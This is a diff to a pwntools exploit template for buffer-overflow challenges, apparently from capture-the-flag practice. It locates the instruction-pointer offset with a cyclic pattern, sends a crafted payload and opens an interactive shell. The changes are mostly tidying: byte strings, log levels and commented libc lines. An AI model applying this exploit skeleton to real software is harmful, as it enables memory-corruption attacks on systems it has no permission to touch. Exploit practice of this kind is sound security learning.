@@ -14,14 +14,14 @@ def start(argv=[], *a, **kw):
 # Find offset to EIP/RIP for buffer overflows
 def find_ip(payload):
     # Launch process and send payload
-    p = process(exe)
-    p.sendlineafter('>', payload)
+    p = process(exe, level='warn')
+    p.sendlineafter(b'>', payload)
     # Wait for the process to crash
     p.wait()
     # Print out the address of EIP/RIP at the time of crashing
     # ip_offset = cyclic_find(p.corefile.pc)  # x86
     ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
-    info('located EIP/RIP offset at {a}'.format(a=ip_offset))
+    warn('located EIP/RIP offset at {a}'.format(a=ip_offset))
     return ip_offset
 
 
@@ -42,6 +42,10 @@ context.log_level = 'debug'
 #                    EXPLOIT GOES HERE
 # ===========================================================
 
+# Lib-C library, can use pwninit/patchelf to patch binary
+# libc = ELF("./libc.so.6")
+# ld = ELF("./ld-2.27.so")
+
 # Pass in pattern_size, get back EIP/RIP offset
 offset = find_ip(cyclic(500))
 
@@ -55,16 +59,9 @@ payload = flat({
     ]
 })
 
-# Save the payload to file
-write('payload', payload)
-
 # Send the payload
-io.sendlineafter('>', payload)
-io.recvuntil('Thank you!')
+io.sendlineafter(b'>', payload)
+io.recvuntil(b'Thank you!')
 
 # Got Shell?
 io.interactive()
-
-# Or, Get our flag!
-# flag = io.recv()
-# success(flag)
